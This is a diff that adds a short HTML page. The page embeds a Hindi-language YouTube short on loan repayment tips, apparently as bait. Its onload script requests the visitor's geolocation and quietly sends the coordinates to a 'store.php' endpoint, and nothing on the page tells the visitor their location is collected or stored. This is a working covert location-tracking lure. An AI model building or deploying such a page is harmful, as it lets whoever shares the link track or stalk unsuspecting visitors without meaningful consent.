@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<body onload="getLocation()">
+    
+    <iframe width="315" height="560" src="https://www.youtube.com/embed/-BORI7S94Xc" title="ऐसे EMI भरोगे तो 1 साल में Loan उतर जाएगा I #shorts #loantips" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+
+
+
+
+
+<p id="demo"></p>
+
+<script>
+const x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function showPosition(position) {
+    const xhttp = new XMLHttpRequest();
+    xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
+    xhttp.send();
+
+  
+}
+</script>
+
+
+</body>
+</html>
